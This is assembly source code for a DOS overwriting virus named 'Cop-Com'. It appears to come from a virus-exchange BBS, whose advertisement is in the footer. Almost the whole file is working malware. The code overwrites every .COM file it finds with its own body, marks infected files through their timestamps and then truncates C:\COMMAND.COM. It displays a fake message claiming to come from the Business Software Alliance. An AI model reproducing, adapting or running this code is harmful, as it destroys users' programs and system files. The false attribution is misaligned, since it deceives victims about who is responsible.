;
; Cop-Com Virus
;
                Org 100h

Main:           Xor Cx,Cx
On1:            Call CritErr
                Inc Cx
                Cmp Cx,10
                Jb  Infect
                Push Cs
                Pop Ds
                Mov Ah,3ch
                Lea Dx,Command
                Xor Cx,Cx
                Int 21h
                Mov Ah,9
                Lea Dx,Msg
                Int 21h
                Jmp ShutDown
;
; Infection procedure
;
Infect:         Push Cx
                Mov Ah,4eh
                Push Cs
                Pop Ds
NextFile:       Xor Cx,Cx
                Lea Dx,COMFILE
                Int 21h
                Jc  Einde
                Mov Ax,Cs:[96h]
                And Ax,1fh
                Cmp Ax,1fh
                Jne Do_It
                Mov Ah,4fh
                Jmp NextFile
Do_It:          Mov Ax,3d02h
                Mov Dx,9eh
                Int 21h
                Xchg Ax,Bx
                Mov Ax,5700h
                Int 21h
                Push Cx
                Push Dx
                Mov Ah,40h
                Mov Dx,100h
                Mov Cx,VirLen
                Int 21h
                Pop Dx
                Pop Cx
                Or Cx,1fh
                Mov Ax,5701h
                Int 21h
                Mov Ah,3eh
                Int 21h
Einde:          Pop Cx
                Jmp On1

;
; Routine for calling the critical error handler
;
CritErr:        Mov Ah,19h
                Int 21h
                Xor Dx,Dx
                Mov Ds,Dx
                Mov Ah,3ah
                Pushf
                Call Dword ptr Ds:[90h]
                Cmp Al,2
                Jae ShutDown
                Ret


;
; Terminate routine
;
ShutDown:       Mov Ax,4c00h
                Int 21h


;
; Activate message
;
Msg             Db 13,10,'Program halted by Cop-Com'
                Db 13,10,'Unauthorized program on your system'
                Db 13,10,'Consult Local dealer for support'
                Db 13,10,'$'

                Db '> (C) Business Software Alliance <'

;
; Filespecs
;
Command         Db 'C:\COMMAND.COM',0
COMFILE         Db '*.COM',0

VirLen          Equ $-Main

;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
;  컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
